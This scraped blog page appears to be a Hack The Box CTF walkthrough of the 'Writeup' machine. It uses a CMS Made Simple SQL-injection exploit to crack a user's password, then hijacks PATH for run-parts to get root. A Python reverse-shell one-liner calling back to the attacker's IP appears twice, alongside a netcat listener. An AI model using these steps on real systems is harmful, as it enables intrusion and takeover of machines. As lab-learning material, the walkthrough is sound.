&gt; /run/motd.dynamic.new 2019/08/28 23:52:55 CMD: UID=0 PID=26057 | run-parts --lsbsysinit /etc/update-motd.d ... 2019/08/28 23:54:27 CMD: UID=0 PID=26076 | sshd: [accepted] 2019/08/28 23:54:27 CMD: UID=0 PID=26077 | sshd: [accepted] 2019/08/28 23:54:31 CMD: UID=0 PID=26078 | sshd: jkr [priv] 2019/08/28 23:54:31 CMD: UID=0 PID=26079 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin: /usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2019/08/28 23:54:31 CMD: UID=0 PID=26080 | run-parts --lsbsysinit /etc/update-motd.d By some chance, I noticed that the 2 commands were being run every time someone has logged in via ssh! So lets try this again… root.txt On my machine (listener): 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... On the Writeup machine: 1 2 3 4 jkr@writeup:/tmp$ echo &quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con nect((\\&quot;10.10.XXX.XXX\\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call ([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#39;&quot; &gt; /usr/local/sbin/run-parts jkr@writeup:/tmp$ chmod 777 /usr/local/sbin/run-parts Again on my machine (on another terminal): 1 2 3 $ ssh jkr@writeup.htb jkr@writeup.htb&#39;s password: Again on my machine (listener): 1 2 3 4 connect to [10.10.XXX.XXX] from (UNKNOWN) [10.10.10.138] 59722 /bin/sh: 0: can&#39;t access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) We are in! 1 2 3 4 5 6 # cd /root # ls bin root.txt # cat root.txt eebaXXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/writeup-htb/","@type":"BlogPosting","headline":"Hack The Box - Writeup","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2019-10-13T15:35:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Writeup | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 13, 2019, 3:35 PM +0800" > Oct 13, 2019 <i class="unloaded">2019-10-13T15:35:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Jan 3, 2021, 8:34 PM +0800" > Jan 3, 2021 <i class="unloaded">2021-01-03T20:34:47+08:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1442 words">8 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/writeup.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>Always remember to map a domain name to the machine’s IP address to ease your rooting !</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.138 writeup.htb"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><p>Using <code class="language-plaintext highlighter-rouge">nmap</code>, we are able to determine the open ports and running services on the machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sS</span> writeup.htb <span class="nt">-p</span> 1-65535 <span class="nt">-T4</span>
Nmap scan report <span class="k">for </span>writeup.htb <span class="o">(</span>10.10.10.138<span class="o">)</span>
Host is up <span class="o">(</span>0.25s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>250.07 seconds
</pre></table></code></div></div><p>Not much can be done with the <code class="language-plaintext highlighter-rouge">ssh</code> service as we do not have any credentials on hand so lets come back to it later. As for the <code class="language-plaintext highlighter-rouge">http</code> service, lets see if we can gather any information or exploit it ?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/writeup1.png" alt="" /></p><p>Hmm DoS Protection… I guess we cannot simply brute force the directory and pages on this web server. Maybe lets check if they have a <code class="language-plaintext highlighter-rouge">robots.txt</code> ?</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/writeup2.png" alt="" /></p><p>Alright they do ! And they even have a small robot ascii art on it ! :) Seems like there is also a <code class="language-plaintext highlighter-rouge">writeup</code> directory so lets try accessing it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/writeup3.png" alt="" /></p><p>This looks like a blog containing writeups of different HTB machines ? No wonder the machine is called <code class="language-plaintext highlighter-rouge">writeup</code>…</p><h1 id="exploitation">Exploitation</h1><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/writeup4.png" alt="" /></p><p>Checking the source of the page, we find out that the website is using <code class="language-plaintext highlighter-rouge">CMS Made Simple</code>. Maybe we can find some exploits for it ?</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="nv">$ </span>searchsploit CMS Made Simple
<span class="nt">------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
 Exploit Title                                                                |  Path
                                                                              | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>
<span class="nt">------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
CMS Made Simple <span class="o">(</span>CMSMS<span class="o">)</span> Showtime2 - File Upload Remote Code Execution <span class="o">(</span>Metasp | exploits/php/remote/46627.rb
CMS Made Simple 0.10 - <span class="s1">'Lang.php'</span> Remote File Inclusion                       | exploits/php/webapps/26217.html
CMS Made Simple 0.10 - <span class="s1">'index.php'</span> Cross-Site Scripting                       | exploits/php/webapps/26298.txt
CMS Made Simple 1.0.2 - <span class="s1">'SearchInput'</span> Cross-Site Scripting                    | exploits/php/webapps/29272.txt
CMS Made Simple 1.0.5 - <span class="s1">'Stylesheet.php'</span> SQL Injection                        | exploits/php/webapps/29941.txt
CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities       | exploits/php/webapps/32668.txt
CMS Made Simple 1.11.9 - Multiple Vulnerabilities                             | exploits/php/webapps/43889.txt
CMS Made Simple 1.2 - Remote Code Execution                                   | exploits/php/webapps/4442.txt
CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                          | exploits/php/webapps/4810.txt
CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload              | exploits/php/webapps/5600.php
CMS Made Simple 1.4.1 - Local File Inclusion                                  | exploits/php/webapps/7285.txt
CMS Made Simple 1.6.2 - Local File Disclosure                                 | exploits/php/webapps/9407.txt
CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting           | exploits/php/webapps/33643.txt
CMS Made Simple 1.6.6 - Multiple Vulnerabilities                              | exploits/php/webapps/11424.txt
CMS Made Simple 1.7 - Cross-Site Request Forgery                              | exploits/php/webapps/12009.html
CMS Made Simple 1.8 - <span class="s1">'default_cms_lang'</span> Local File Inclusion                 | exploits/php/webapps/34299.py
CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery       | exploits/php/webapps/34068.html
CMS Made Simple 2.1.6 - Multiple Vulnerabilities                              | exploits/php/webapps/41997.txt
CMS Made Simple 2.1.6 - Remote Code Execution                                 | exploits/php/webapps/44192.txt
CMS Made Simple 2.2.5 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                 | exploits/php/webapps/44976.py
CMS Made Simple 2.2.7 - <span class="o">(</span>Authenticated<span class="o">)</span> Remote Code Execution                 | exploits/php/webapps/45793.py
CMS Made Simple &lt; 1.12.1 / &lt; 2.1.3 - Web Server Cache Poisoning               | exploits/php/webapps/39760.txt
CMS Made Simple &lt; 2.2.10 - SQL Injection                                      | exploits/php/webapps/46635.py
CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload              | exploits/php/webapps/34300.py
CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload         | exploits/php/webapps/34298.py
CMS Made Simple Showtime2 Module 3.6.2 - <span class="o">(</span>Authenticated<span class="o">)</span> Arbitrary File Uploa | exploits/php/webapps/46546.py
<span class="nt">------------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
Shellcodes: No Result
Papers: No Result
</pre></table></code></div></div><p>Oh wow there are so many exploits! But which one do we use ?</p><p>After some trial and error, the one that worked for me was <code class="language-plaintext highlighter-rouge">CMS Made Simple &lt; 2.2.10 - SQL Injection</code>. Using the <code class="language-plaintext highlighter-rouge">--crack</code> option and specifying <code class="language-plaintext highlighter-rouge">rockyou.txt</code> as the wordlist,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nv">$ </span>python  /usr/share/exploitdb/exploits/php/webapps/46635.py <span class="nt">-h</span>
Usage: 46635.py <span class="o">[</span>options]

Options:
  <span class="nt">-h</span>, <span class="nt">--help</span>            show this <span class="nb">help </span>message and <span class="nb">exit</span>
  <span class="nt">-u</span> URL, <span class="nt">--url</span><span class="o">=</span>URL     Base target uri <span class="o">(</span>ex. http://10.10.10.100/cms<span class="o">)</span>
  <span class="nt">-w</span> WORDLIST, <span class="nt">--wordlist</span><span class="o">=</span>WORDLIST
                        Wordlist <span class="k">for </span>crack admin password
  <span class="nt">-c</span>, <span class="nt">--crack</span>           Crack password with wordlist

<span class="nv">$ </span>python CVE-2019-9053.py <span class="nt">-u</span> http://writeup.htb/writeup <span class="nt">--crack</span> <span class="nt">-w</span> /usr/share/wordlists/rockyou.txt
<span class="o">[</span>+] Salt <span class="k">for </span>password found: 5a599ef579066807
<span class="o">[</span>+] Username found: jkr
<span class="o">[</span>+] Email found: jkr@writeup.htb
<span class="o">[</span>+] Password found: 62def4866937f08cc13bab43bb14e6f7
<span class="o">[</span>+] Password cracked: raykayjay9
</pre></table></code></div></div><p>Neat ! We got the password for user <code class="language-plaintext highlighter-rouge">jkr</code>!</p><h1 id="usertxt">user.txt</h1><p>If we try to access <code class="language-plaintext highlighter-rouge">ssh</code> into <code class="language-plaintext highlighter-rouge">jkr</code>’s account using the credentials we found,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ssh jkr@writeup.htb
jkr@writeup.htb<span class="s1">'s password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

jkr@writeup:~$ ls
user.txt
jkr@writeup:~$ cat user.txt
d4e4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span></pre></table></code></div></div><h1 id="enumeration">Enumeration</h1><p>As <code class="language-plaintext highlighter-rouge">jkr</code>, we need to know what processes are being runned on the machine. To do so, I will be using <a href="https://github.com/DominicBreuker/pspy">pspy</a>. To transfer it from my machine to this machine, I will be using <code class="language-plaintext highlighter-rouge">python</code>’s <code class="language-plaintext highlighter-rouge">SimpleHTTPServer</code> module.</p><p>On my machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mkdir </span>httpserver
<span class="nv">$ </span><span class="nb">cd </span>httpserver
<span class="nv">$ </span><span class="nb">cp</span> ~/Downloads/pspy64 <span class="nb">.</span>
<span class="nv">$ </span>python <span class="nt">-m</span> SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
</pre></table></code></div></div><p>On the <code class="language-plaintext highlighter-rouge">Writeup</code> machine:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>jkr@writeup:~<span class="nv">$ </span><span class="nb">cd</span> /tmp
jkr@writeup:/tmp<span class="nv">$ </span>wget http://10.10.XXX.XXX/pspy64
<span class="nt">--2019-08-28</span> 22:59:29--  http://10.10.XXX.XXX/pspy64
Connecting to 10.10.XXX.XXX:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4468984 <span class="o">(</span>4.3M<span class="o">)</span> <span class="o">[</span>application/octet-stream]
Saving to: ‘pspy64’

pspy64                        100%[<span class="o">==============================================&gt;]</span>   4.26M  1006KB/s    <span class="k">in </span>5.2s    

2019-08-28 22:59:34 <span class="o">(</span>842 KB/s<span class="o">)</span> - ‘pspy64’ saved <span class="o">[</span>4468984/4468984]

jkr@writeup:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 pspy64
jkr@writeup:/tmp<span class="nv">$ </span>./pspy64
</pre></table></code></div></div><p>After monitoring for a while, we see some commands being run as <code class="language-plaintext highlighter-rouge">root</code>,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>2019/08/28 23:02:25 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2313   | sh <span class="nt">-c</span> /usr/bin/env <span class="nt">-i</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts <span class="nt">--lsbsysinit</span> /etc/update-motd.d <span class="o">&gt;</span> /run/motd.dynamic.new 
2019/08/28 23:02:25 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>2314   | run-parts <span class="nt">--lsbsysinit</span> /etc/update-motd.d
</pre></table></code></div></div><p>For the first command, it is mainly setting the <code class="language-plaintext highlighter-rouge">$PATH</code> environment variable which determines where the system looks for executables. For the second command, it is running the <code class="language-plaintext highlighter-rouge">run-parts</code> command.</p><p>When I checked where the <code class="language-plaintext highlighter-rouge">run-parts</code> executable was located,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>jkr@writeup:/tmp<span class="nv">$ </span>which run-parts
/bin/run-parts
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">run-parts</code> was found at <code class="language-plaintext highlighter-rouge">/bin</code> but <code class="language-plaintext highlighter-rouge">/bin</code> is not the first location that the system will look for executables. How can we take advantage of this fact ? If we create an executable called <code class="language-plaintext highlighter-rouge">run-parts</code> at <code class="language-plaintext highlighter-rouge">/usr/local/sbin</code>, the system will execute that instead of the <code class="language-plaintext highlighter-rouge">run-parts</code> at <code class="language-plaintext highlighter-rouge">/bin</code>!</p><h1 id="privilege-escalation">Privilege Escalation</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>jkr@writeup:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.con
nect((</span><span class="se">\"</span><span class="s2">10.10.XXX.XXX</span><span class="se">\"</span><span class="s2">,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call
([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'"</span> <span class="o">&gt;</span> /usr/local/sbin/run-parts
jkr@writeup:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 /usr/local/sbin/run-parts
</pre></table></code></div></div><p>For the executable, it is a script that contains the command that establishes a reverse shell back to our listener.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
</pre></table></code></div></div><p>After a long while, I realised that I was not catching any connections from the <code class="language-plaintext highlighter-rouge">Writeup</code> machine. Is the <code class="language-plaintext highlighter-rouge">run-parts</code> not getting run ? Lets run <code class="language-plaintext highlighter-rouge">pspy</code> again to find out why!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>2019/08/28 23:52:51 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26053  | sshd: <span class="o">[</span>accepted]
2019/08/28 23:52:51 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26054  | sshd: <span class="o">[</span>accepted]  
2019/08/28 23:52:55 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26055  | sshd: jkr <span class="o">[</span>priv]  
2019/08/28 23:52:55 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26056  | sh <span class="nt">-c</span> /usr/bin/env <span class="nt">-i</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts <span class="nt">--lsbsysinit</span> /etc/update-motd.d <span class="o">&gt;</span> /run/motd.dynamic.new 
2019/08/28 23:52:55 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26057  | run-parts <span class="nt">--lsbsysinit</span> /etc/update-motd.d 
...
2019/08/28 23:54:27 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26076  | sshd: <span class="o">[</span>accepted]
2019/08/28 23:54:27 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26077  | sshd: <span class="o">[</span>accepted]  
2019/08/28 23:54:31 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26078  | sshd: jkr <span class="o">[</span>priv]  
2019/08/28 23:54:31 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26079  | sh <span class="nt">-c</span> /usr/bin/env <span class="nt">-i</span> <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:
/usr/bin:/sbin:/bin run-parts <span class="nt">--lsbsysinit</span> /etc/update-motd.d <span class="o">&gt;</span> /run/motd.dynamic.new 
2019/08/28 23:54:31 CMD: <span class="nv">UID</span><span class="o">=</span>0    <span class="nv">PID</span><span class="o">=</span>26080  | run-parts <span class="nt">--lsbsysinit</span> /etc/update-motd.d 
</pre></table></code></div></div><p>By some chance, I noticed that the 2 commands were being run every time someone has logged in via <code class="language-plaintext highlighter-rouge">ssh</code>! So lets try this again…</p><h1 id="roottxt">root.txt</h1><p>On my machine (listener):</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
